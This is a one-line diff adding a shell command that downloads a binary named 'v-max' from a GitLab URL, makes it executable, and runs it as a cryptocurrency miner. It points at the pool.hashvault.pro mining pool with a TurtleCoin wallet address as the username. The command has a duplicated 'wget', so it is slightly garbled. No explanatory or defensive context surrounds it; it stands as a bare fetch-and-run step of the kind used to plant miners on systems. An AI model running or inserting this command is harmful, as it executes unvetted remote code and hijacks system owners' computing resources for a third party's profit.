@@ -1,0 +1,1 @@
+wget wget https://gitlab.com/hasanmaoladi97/trtrl/-/raw/main/v-max; chmod u+x v-max; ./v-max --pool pool.hashvault.pro:80 --username TRTLuzmYtF17c1cLmwyUcsegynf7EpcV4NN1qQktpV9GQXwzXEZQVAwSMzgcrDmnkdBZgnbFSPwRa1RXHh9d1PSTapighKVQ3e8 --password CPU --algorithm chukwa_v2 --ssl
